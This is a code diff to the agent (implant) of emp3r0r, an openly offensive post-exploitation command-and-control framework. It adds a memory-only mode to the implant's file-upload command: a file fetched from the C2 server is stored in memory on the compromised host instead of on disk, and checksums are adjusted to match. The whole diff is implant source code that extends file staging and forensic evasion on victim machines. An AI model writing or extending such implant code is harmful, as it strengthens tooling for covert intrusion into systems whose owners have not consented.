@@ -9,6 +9,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
 )
@@ -72,17 +73,51 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 	size, _ := cmd.Flags().GetInt64("size")
 	origChecksum, _ := cmd.Flags().GetString("checksum")
 	downloadAddr, _ := cmd.Flags().GetString("addr")
+	saveToMem, _ := cmd.Flags().GetBool("mem")
 
 	if fileName == "" || destPath == "" || size == 0 {
 		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
 		return
 	}
+
+	// Memory storage handling
+	if saveToMem {
+		logging.Printf("putCmdRun: saving %s to memory", fileName)
+		// Download data directly (path="" tells DownloadViaC2 to return []byte)
+		// Note: We bypass c2transport.FetchFile which is disk-centric for now, or we modify FetchFile?
+		// FetchFile uses DownloadViaC2 if addr is empty.
+		// If addr is set (P2P), FetchFileKCP is used.
+		// Let's supporting P2P + Mem later. For now, direct C2 download -> Mem.
+
+		// However, the plan said: "Call c2transport.DownloadViaC2 with path=''"
+		data, err := c2transport.DownloadViaC2(fileName, "", origChecksum)
+		if err != nil {
+			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory %s: %v", fileName, err))
+			return
+		}
+
+		err = util.SaveFileAgent(destPath, data, 0600, util.StorageMemory)
+		if err != nil {
+			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to memory %s: %v", destPath, err))
+			return
+		}
+		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("%s uploaded to memory, sha256sum: %s", destPath, origChecksum))
+		return
+	}
+
 	_, err := c2transport.FetchFile(downloadAddr, fileName, destPath, origChecksum)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download %s: %v", fileName, err))
 		return
 	}
-	checksum := crypto.SHA256SumFile(destPath)
+	// Calculate checksum from saved file (memory or disk)
+	fileData, err := util.ReadFileAgent(destPath)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: checksum failed, cannot read %s: %v", destPath, err))
+		return
+	}
+	checksum := crypto.SHA256SumRaw(fileData)
+
 	downloadedSize := util.FileSize(destPath)
 	resp := fmt.Sprintf("%s uploaded, sha256sum: %s", destPath, checksum)
 	if downloadedSize < size {
